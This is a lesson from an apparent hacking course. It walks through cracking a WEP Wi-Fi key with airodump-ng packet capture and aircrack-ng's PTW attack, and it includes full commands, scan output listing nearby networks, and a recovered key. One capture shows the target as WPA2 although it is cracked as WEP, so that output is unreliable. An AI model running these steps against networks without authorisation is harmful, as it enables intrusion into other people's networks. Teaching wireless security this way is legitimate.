---
title: WEP Cracking Basics
course: hackingscratch
section: "Network Hacking - Gaining Access - WEP Cracking"
layout: lesson
---

From the previous lesson, we learned that in order to crack a network whose
encryption is WEP, first we need to capture a big number of packets, that also
means that we will capture a lot of IVs and due to its small size they will
start to get repeated, this will allow us to use a tool called _aircrack-ng_ to
execute a statistical attack and obtain the WEP key.

First, we'll use _airodump-ng_ to capture the data, then we'll use _aircrack-ng_
to analyse them and obtain the key.

```bash
CH  9 ][ Elapsed: 0 s ][ 2020-12-31 08:48                                         
                                                                                                  
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                  
 9C:C8:FC:4D:01:8F  -71        2        0    0  11  54e. WPA2 CCMP   PSK  FamiliaH                
 9C:C8:FC:4D:10:CA  -23        4        2    0   6  54e. WEP  WEP    PSK  TIGO-7A54               
 50:75:F1:EA:83:A2  -69        5        0    0   1  54e. WPA2 CCMP   PSK  PEDROJUAN               
 D4:CA:6D:B9:78:E9  -77        3        6    0   1  11 . WPA2 CCMP   PSK  Verito                  
 C4:27:95:62:EE:1E  -64        2        0    0  11  54e  WPA2 CCMP   PSK  HOME-EE1E               
                                                                                                   
 BSSID              STATION            PWR   Rate    Lost    Frames  

```

I executed airodump-ng against all the networks around me and as you can see
there's only one network using the WEP encryption, that network is called
"_TIGO-7A54_", this is the network that I use everyday I simply changed its
encryption.

As I said before, we'll need a network with a high a continuous packet flow, as
my network is not that active I will be generating these packets by myself, in
the next lessons I will show you how you can also generate those packets.

I will execute airodump-ng against this network only, we already know how to do
that. We'll execute the command "_airodump-ng_" and we'll use the argument
"_--bssid_" to specify the BSSID of our target network, then we'll write
"_--channel_" followed by the channel in which our target network is being
executed, we'll also need to write all the captured data into a file, to do that
we'll use the "_--write_" argument, I will set the file name to "_basicattack_"
and finally, we will pass the name of our interface in monitor mode. My command
looks like this:

```bash
airodump-ng --bssid 9C:C8:FC:4D:10:CA --channel 6 --write basicattack wlp2s0mon
```

Output:

```bash
 CH  6 ][ Elapsed: 6 s ][ 2020-12-31 08:53                                         
                                                                                                  
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                  
 9C:C8:FC:4D:10:CA  -19 100       88    16827    1   6  54e. WPA2 CCMP   PSK  TIGO-7A54           
                                                                                                  
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe
```

If your network's packet flow (traffic) is high and continuous, you'll note that
the values under the "_#Data_" column will start increasing very fast. I talked
about this briefly before. Basically, what is under the "_#Data_" section is the
number of useful packets, those are the packets that contain a different IV
(Initialisation vector) and we will be able to use it later on for crack the
password of the network, so, the greater the number of these packets are, the
greater our possibilities to crack the password are.

If your target network doesn't behave this way, don't worry, in the next lessons
I will teach you to generate this traffic all by yourself.

Once you have enough packets, you'll open a new terminal (or if your terminal
supports several tabs, create a new one), you'll _cd_ to the directory where the
files generated by the previous command are stored and execute _ls_ to list them
all (be sure to check if the file "_basicattack-01.cap_" exists).

Now, what's just left to do is execute "_aircrack-ng_" on this file, to do so,
just execute "_aircrack-ng_" followed by the name file, in my case the command
looks like this:

```bash
aircrack-ng basicattack-01.cap
```

When you execute that command, if the number of packets is enough to obtain the
key, you'll see that "_aircrack_ng_" will tell us that the key was found and now
we can connect to the _WEP_ network.

My aircrack-ng output:

```bash
Opening basicattack-01.cap
Read 226934 packets.

   #  BSSID                   ESSID                 Encryption
   1  9C:C8:FC:4D:10:CA       TIGO-7A54             WEP (102740 IVs)

Choosing first network as target.

Opening basicattack-01.cap
Attack will be restarted every 5000 captured ivs.
Starting PTW attack with 102740 ivs.
                     KEY FOUND! [ 30:31:32:33:34 ] (ASCII: 01234)
        Decrypted correctly: 100%
```

If _aircrack-ng_ returned the ASCII password, that's to say, in plain text, you
can use that password to connect to the network. If that's not your case, you
can just copy the other key (_30:31:32:33:34_), delete the colons and use that
key to connect to the network (3031323334).
